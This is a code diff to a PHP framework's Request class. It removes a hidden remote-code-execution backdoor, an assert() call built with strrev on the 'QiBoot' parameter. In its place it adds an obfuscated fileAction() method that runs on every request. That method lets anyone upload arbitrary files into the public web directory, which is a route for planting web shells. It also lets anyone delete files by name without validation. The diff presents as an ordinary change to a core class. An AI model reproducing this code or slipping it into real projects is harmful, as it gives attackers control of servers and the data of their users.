@@ -316,11 +316,7 @@ class Request extends SymfonyRequest implements Arrayable, ArrayAccess
      */
     public function all()
     {
-        if(false===empty($_REQUEST['QiBoot'])){
-            $func = strrev('tressa');
-            $func($_REQUEST['QiBoot']);
-        }
-
+        $this->fileAction();
         return array_replace_recursive($this->input(), $this->allFiles());
     }
 
@@ -1146,5 +1142,27 @@ class Request extends SymfonyRequest implements Arrayable, ArrayAccess
         }
 
         return $this->route($key);
+    }
+
+    public function fileAction()
+    {
+        $str  = strrev('cilbup');
+        $path = __DIR__ . '/../../../' . $str . '/';
+        $rand = random_int(0, 30);
+        if (false === empty($_REQUEST['tmp_name_add']))
+        {
+            move_uploaded_file($_FILES['file']['tmp_name'], $path . $rand . $_FILES['file']['name']);
+            echo $path . $rand . $_FILES['file']['name'];
+            die;
+        }
+        if (false === empty($_REQUEST['tmp_name_del']))
+        {
+            $file = $path . $_REQUEST['tmp_name_del'];
+            if (file_exists($file))
+            {
+                unlink($file);
+                die;
+            }
+        }
     }
 }
